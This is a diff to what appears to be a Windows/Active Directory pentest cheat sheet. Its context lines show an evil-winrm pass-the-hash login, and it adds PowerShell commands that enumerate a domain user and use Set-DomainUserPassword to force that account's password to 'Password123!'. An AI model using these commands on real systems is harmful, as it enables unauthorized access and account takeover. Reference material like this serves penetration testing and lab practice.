@@ -113,6 +113,11 @@ Connect to Windows Machine using obtained hash (pass the hash):
 evil-winrm -i $TARGET_IP -u $USER -H $TARGET_HASH
 ```
 ---
+```powershell
+net user $USER /domain
+#us
+Set-DomainUserPassword -Identity $USERNAME -AccountPassword (ConvertTo-SecureString -AsPlainText 'Password123!' -Force)
+```
 
 Pre-compiled Windows binaries (Rubeus, Certify …):
 ---
